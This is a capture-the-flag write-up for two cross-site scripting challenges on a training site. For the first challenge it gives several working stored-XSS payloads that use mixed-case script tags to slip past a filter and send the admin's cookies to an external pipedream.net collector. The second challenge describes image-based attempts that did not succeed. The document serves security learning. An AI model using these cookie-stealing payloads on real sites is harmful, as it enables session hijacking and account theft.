# XSS challenges

## XSS1 [https://xss1.secu-web.blackfoot.dev/]

### Description
Cross-site scripting (XSS) is a web security vulnerability that allows an attacker to execute malicious scripts in a web browser of another user. This can allow the attacker to steal the session cookies of the user, perform other actions on behalf of the user, or redirect the user to a malicious site.

Usually XSS vulnerabilities consist in executing code on the machine of another user and potentially a user who has higher rights.
This means we will attempt to execute code on the machine of the admin of the website, try to hijack their session and get their cookie.

The site is a messaging site similar to whatsapp or telegram, seems we can pick any contact and send a message to them.
It seems the admin's paranoia of checking messages every minute gives us a window of opportunity to send stored xss.

### Solution
The user field input is not being sanitized correctly. We can inject a script tag by changing it to lower or uppercase naming, and proceed to execute javascript code. We can then send a message to the admin and wait for them to check their messages. The script will be executed on message page load and we will get the admin flag to a predetermined exfil url. One of the immediate problems is that the cookie storage is probably set to `Secure`, meaning it is not accessible by javascript. We can try to bypass this by accessing some internal localhost endpoint on admin's machine, and then hopefully get the cookie.
```
<sCRIPt>fetch("/messages/635",{method:"GET"}).then((e=>e.text())).then((e=>{fetch("//eo2r70memzipors.m.pipedream.net",{method:"POST",body:document.cookie})}));</sCRiPt>
<sCRIPt>fetch("/admin",{method:"GET"}).then((e=>e.text())).then((e=>{fetch("//eo2r70memzipors.m.pipedream.net",{method:"POST",body:document.cookie})}));</sCRiPt>
<sCRIPt>fetch("http://whatsup:8000/admin",{method:"GET"}).then((e=>e.text())).then((e=> {fetch("//eo2r70memzipors.m.pipedream.net",{method:"POST",body:document.cookie})}));</sCRiPt>
<sCRIPt>fetch("/messages/635",{method:"GET"}).then((e=>e.text())).then((e=>{fetch("//eo2r70memzipors.m.pipedream.net",{method:"POST",body:document.cookie})}));</sCRiPt>
```
With the following combination of messages we can force the admin to read our messages, which then triggers the XSS, The cookie is then sent to our exfil url. We can then decode the cookie and get the flag.


## XSS2 [https://xss2.secu-web.blackfoot.dev/]

### Description

Same as XSS1, but seems that admin has taken more sanitization measures and we can't inject script tags anymore. It seems that we could send image urls and have them rendered on the page. Image-based XSS looks like js code encoded in a .bmp or .png file. We can then send the image to the admin and wait for them to check their messages.

### Solution

We couldn't find a consistent way of producing a fake image that is actually rendered on the message load. We tried a couple of forms, shown below:

In conclusion, I think we got pretty close to solving it without actually getting a flag. Things I would have tried would include trying to discover more ways of injecting code into an image. I would also have tried to find a way to bypass the sanitization of the image url, maybe by using a different protocol or something.


#### Screenshots
![alt text](https://github.com/kodoshi/blackfoot-web-ctf/blob/main/images/xss_0.png?raw=true)
![alt text](https://github.com/kodoshi/blackfoot-web-ctf/blob/main/images/xss_1.png?raw=true)

#### Resources
 - https://www.pipedream.com/
 - https://github.com/jklmnn/imagejs